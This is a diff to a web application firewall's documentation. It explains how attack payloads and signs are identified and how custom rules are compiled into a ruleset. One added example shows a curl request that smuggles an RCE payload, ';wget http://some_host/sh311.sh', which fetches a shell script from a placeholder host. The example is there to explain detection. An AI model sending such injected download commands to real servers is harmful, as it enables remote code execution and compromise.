@@ -31,6 +31,16 @@ This hit grouping is applied to all hits. In Wallarm Console, you can additional
 
     Since attack signs are not used to detect [behavioral attacks](../attacks-vulns-list.md#attack-types), requests sent as a part of behavioral attacks have empty payloads.
 
+For example, in this request:
+
+```bash
+curl localhost/?23036d6ba7=%3Bwget+http%3A%2F%2Fsome_host%2Fsh311.sh
+```
+
+the malicious payload is `;wget http://some_host/sh311.sh`, where `;wget+` is the [RCE](../attacks-vulns-list.md#remote-code-execution-rce) attack sign and the rest is its context.
+
+![Attack components in Wallarm Console](../images/user-guides/events/attack-components.png)
+
 [Learn how to analyze attacks in Wallarm →](../user-guides/events/check-attack.md)
 
 ## Types of protected resources
@@ -77,7 +87,9 @@ Wallarm additionally validates SQL injection attacks (**libdetection** library, 
 
 ### Custom rules
 
-Custom [rules](../user-guides/rules/rules.md) are used to fine-tune the behavior defined by basic set of detectors. Users create them in Wallarm Console and the set of them is uploaded to the filtering node.
+Custom [rules](../user-guides/rules/rules.md) fine-tune the behavior defined by the basic set of detectors — for example, they mask sensitive data before it is uploaded to the Wallarm Cloud, add regexp-based attack indicators, apply a virtual patch against an active vulnerability, or disable attack detection in specific requests. You create them in Wallarm Console.
+
+Together with [mitigation controls](#mitigation-controls), your custom rules are compiled into a **custom ruleset** (formerly LOM) that Wallarm nodes download from the Wallarm Cloud and rely on during request analysis. The ruleset is never empty: by default it already contains the rules created for the account, such as the [filtration mode](../admin-en/configure-wallarm-mode.md#general-filtration-mode) rule. Changes to rules or mitigation controls take effect only after the ruleset is [rebuilt and uploaded](../user-guides/rules/rules.md#ruleset-lifecycle) to the node.
 
 ### Mitigation controls
 
